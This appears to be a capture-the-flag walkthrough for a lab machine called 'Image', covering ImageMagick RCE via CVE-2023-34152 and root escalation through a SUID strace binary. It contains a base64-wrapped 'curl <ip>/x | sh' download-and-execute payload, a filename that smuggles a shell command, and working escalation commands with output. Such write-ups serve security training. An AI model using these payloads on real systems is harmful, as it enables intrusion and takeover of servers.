____

# Walkthrough for Image

# Enumeration

## Nmap

With nmap scan, we notice a web server on the target machine.

The web app describes the format and characteristics of image file.

## ImageMagick

> invoked from the command line as magick, is a free and open-source cross-platform software suite for displaying, creating, converting, modifying, and editing raster images

## Exploitation

### Remote Code execution

We find **"[CVE-2023-34152](https://nvd.nist.gov/vuln/detail/CVE-2023-34152)"** recorded for **ImageMagick**.

The exploit details can be found here: https://github.com/ImageMagick/ImageMagick/issues/6339

Visit the webpage and upload an image file

We can see the ImageMagick version, which may provide an indication of the **CVE-2023-34152** that are applicable to it.

Let's use an image file. You can just create an arbitrary file like "echo -ne test > en.png" as well.

Encode reverse shell payload in base64 encoded form

```bash
echo "curl <ip>/x | sh" | base64 -w 0
```

Rename the image file like below,

```bash
cp en.png '|en"`echo <base64-encoded-payload> | base64 -d | bash`".png
```

Upload the image file and you should get code execution

## Privilege Escalation

After some enumeration we notice that strace binary has it's SUID bit set. We can elevate our privileges like below,

```
root@image:/var/www/html# ls -alh /usr/bin/strace
-rwsr-sr-x 1 root root 1.6M Apr 16  2020 /usr/bin/strace

$ strace -o /dev/null /bin/sh -p
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
bash -p -i
bash: cannot set terminal process group (904): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.0# ls -alh
...
```
